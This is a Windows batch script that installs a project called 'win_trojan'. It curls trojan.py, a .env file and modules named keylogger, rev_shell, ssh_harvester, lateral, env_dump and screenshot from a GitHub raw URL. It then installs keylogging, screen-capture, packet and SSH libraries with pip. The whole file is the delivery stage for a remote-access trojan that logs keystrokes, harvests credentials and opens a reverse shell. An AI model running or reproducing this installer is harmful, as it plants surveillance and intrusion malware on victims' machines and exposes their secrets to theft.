@echo off
setlocal enabledelayedexpansion

:: Configuration
set "REPO_URL=https://raw.githubusercontent.com/Noah-school/win_trojan/main"
set "FILES=trojan.py requirements.txt .env"
set "MODULES=discovery.py env_dump.py keylogger.py lateral.py port_scan.py rev_shell.py screenshot.py ssh_harvester.py system_enum.py"

echo ==========================================
echo       win_trojan Installer / Setup
echo ==========================================

:: Check for Python
python --version >nul 2>&1
if !errorlevel! neq 0 (
    echo [!] Python is not installed or not in PATH.
    echo [!] Please install Python (and check "Add Python to PATH").
    pause
    exit /b 1
)

:: Create directories
echo [*] Creating directory structure...
if not exist "modules" mkdir "modules"
if not exist "config" mkdir "config"
if not exist "data" mkdir "data"

:: Download main files
for %%f in (%FILES%) do (
    echo [*] Downloading %%f...
    curl -s -f -O "!REPO_URL!/%%f"
    if !errorlevel! neq 0 (
        echo [!] Warning: Could not download %%f. 
        echo     (It might be missing from the repository or private)
    )
)

:: Download modules
echo [*] Downloading modules...
for %%m in (%MODULES%) do (
    echo [*]   -> %%m...
    curl -s -f -o "modules/%%m" "!REPO_URL!/modules/%%m"
    if !errorlevel! neq 0 (
        echo [!] Warning: Could not download module %%m.
    )
)

:: Install dependencies
echo [*] Installing dependencies from requirements.txt...
if exist "requirements.txt" (
    pip install -r requirements.txt
    if !errorlevel! neq 0 (
        echo [!] Error occurred during dependency installation.
    )
) else (
    echo [!] requirements.txt not found. Installing common dependencies manually...
    pip install requests github3.py pynput psutil pycryptodome pyautogui scapy paramiko Pillow python-dotenv
)
